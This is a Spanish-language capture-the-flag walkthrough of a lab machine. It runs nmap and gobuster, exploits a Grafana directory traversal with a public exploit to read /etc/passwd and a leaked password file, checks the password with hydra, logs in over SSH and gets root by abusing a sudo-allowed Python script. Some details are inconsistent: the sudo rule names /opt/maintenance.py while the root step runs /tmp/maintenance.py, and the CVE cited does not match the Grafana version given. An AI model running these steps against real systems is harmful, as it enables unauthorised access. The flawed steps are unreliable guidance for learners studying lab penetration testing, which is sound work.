## 1. Reconocimiento Inicial de Puertos con Nmap

Realizamos un escaneo exhaustivo con `nmap` para detectar puertos abiertos, sus versiones y el sistema operativo. Esto nos proporciona una visión general de los servicios expuestos y posibles vulnerabilidades asociadas a sus versiones.

```bash
nmap -O -sC -sV <IP_DEL_OBJETIVO>
```

**Resultados:**

*   `21/tcp open ftp vsftpd 3.0.3`: El puerto 21 (FTP) está abierto y permite acceso anónimo (`ftp-anon`). Esto es un punto de interés para buscar archivos sensibles.
*   `22/tcp open ssh OpenSSH 9.6p1 Debian`: El puerto 22 (SSH) está abierto, lo que indica que podemos intentar acceder al sistema por esta vía si encontramos credenciales.
*   `80/tcp open http Apache httpd 2.4.58`: El puerto 80 (HTTP) está abierto y ejecuta un servidor web Apache. La página por defecto no revela información útil inicialmente.
*   `3000/tcp open http Grafana http`: El puerto 3000 está abierto y ejecuta una instancia de Grafana. Esto es un punto de interés crítico, ya que Grafana es una aplicación compleja que a menudo presenta vulnerabilidades.

## 2. Enumeración Web y Descubrimiento de Información Sensible

Nos centramos en los servicios web y FTP para encontrar pistas.

### 2.1. Exploración del FTP Anónimo

Intentamos acceder al servidor FTP de forma anónima.

```bash
ftp <IP_DEL_OBJETIVO>
# Usuario: anonymous
# Contraseña: anonymous
```

Aunque podemos iniciar sesión, el directorio `mantenimiento` no nos permite descargar archivos, lo que limita su utilidad.

### 2.2. Fuzzing Web en el Puerto 80

Realizamos un fuzzing de directorios con `gobuster` en el puerto 80 para descubrir rutas ocultas o archivos interesantes en el servidor web Apache.

```bash
gobuster dir -w /path/to/wordlist/directory-list-2.3-medium.txt -u http://<IP_DEL_OBJETIVO>
```

**Resultados Relevantes:**

*   `maintenance.html`: Este archivo contiene el mensaje `Webside under maintenance, access is in /tmp/pass.txt`. Esta es una pista que nos indica la ubicación de un archivo con información sensible.

### 2.3. Exploración de Grafana (Puerto 3000)

Al acceder a `http://<IP_DEL_OBJETIVO>:3000/`, encontramos la interfaz de inicio de sesión de Grafana. La versión de Grafana es `6.3.0`. Una búsqueda rápida en `searchsploit` o bases de datos de vulnerabilidades revela que Grafana 6.3.0 es vulnerable a un `Directory Traversal` (CVE-2021-43798.

Esta vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor. Esto es extremadamente útil para obtener credenciales, archivos de configuración o cualquier otra información sensible.

### 2.4. Explotación de Grafana (Directory Traversal)

Utilizamos un exploit conocido para la vulnerabilidad de Directory Traversal en Grafana. Este exploit generalmente permite especificar una ruta de archivo en el servidor para leer su contenido.

Copiamos el exploit de `searchsploit` (por ejemplo, `50581.py` si es el caso) y lo ejecutamos, especificando la IP y el puerto de Grafana.

```bash
cp /usr/share/exploitdb/exploits/multiple/webapps/50581.py exploit.py
python3 exploit.py -H http://<IP_DEL_OBJETIVO>:3000
```

**Lectura de `/etc/passwd`:**

Utilizamos el exploit para leer el archivo `/etc/passwd`, que contiene una lista de usuarios del sistema. Esto es fundamental para identificar posibles nombres de usuario.

```bash
Read file > /etc/passwd
```

**Resultados Clave de `/etc/passwd`:**

*   `freddy:x:1000:1000::/home/freddy:/bin/bash`: Identificamos al usuario `freddy`.

**Lectura de `/tmp/pass.txt`:**

Recordando la pista de `maintenance.html`, utilizamos el exploit para leer el contenido de `/tmp/pass.txt`.

```bash
Read file > /tmp/pass.txt
```

**Resultado:**

*   `t9sH76gpQ82UFeZ3GXZS`: Esta es una cadena que parece ser una contraseña.

## 3. Acceso Inicial (SSH)

Ahora que tenemos un posible nombre de usuario (`freddy`) y una contraseña (`t9sH76gpQ82UFeZ3GXZS`), intentamos acceder al sistema.

### 3.1. Verificación de Credenciales con Hydra (FTP)

Aunque ya tenemos las credenciales, podemos usar `hydra` para verificar si funcionan con el servicio FTP, y de paso, confirmar el usuario si no lo tuviéramos claro. Es una buena práctica para validar credenciales.

```bash
hydra -L /path/to/wordlist/seclists/Usernames/xato-net-10-million-usernames.txt -p t9sH76gpQ82UFeZ3GXZS ftp://<IP_DEL_OBJETIVO>
```

**Salida:**

```bash
[21][ftp] host: 172.17.0.2   login: freddy   password: t9sH76gpQ82UFeZ3GXZS
```

Esto confirma que las credenciales `freddy:t9sH76gpQ82UFeZ3GXZS` son válidas para el servicio FTP.

### 3.2. Conexión SSH

Con las credenciales confirmadas, intentamos acceder vía SSH.

```bash
ssh freddy@<IP_DEL_OBJETIVO>
# Contraseña: t9sH76gpQ82UFeZ3GXZS
```

Si la conexión es exitosa, hemos obtenido acceso inicial al sistema como el usuario `freddy`.

## 4. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `freddy`, el objetivo es escalar privilegios a `root`.

### 4.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario `freddy` con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `(ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py`

Esto significa que el usuario `freddy` puede ejecutar el script Python `/opt/maintenance.py` como cualquier usuario (incluido `root`) sin necesidad de introducir su contraseña.

### 4.2. Abuso de Script Python para Obtener Root

```bash
nano /tmp/maintenance.py
```

Dentro del archivo, pegamos el siguiente código Python:

```python
import os
os.system("/bin/sh")
    ```

Este script simplemente ejecuta una shell (`/bin/sh`).

Ejecutar el script con `sudo`:

```bash
sudo /usr/bin/python3 /tmp/maintenance.py
 ```

Al ejecutar este comando, obtendremos una shell con privilegios de `root`.

```bash
whoami
# root
```
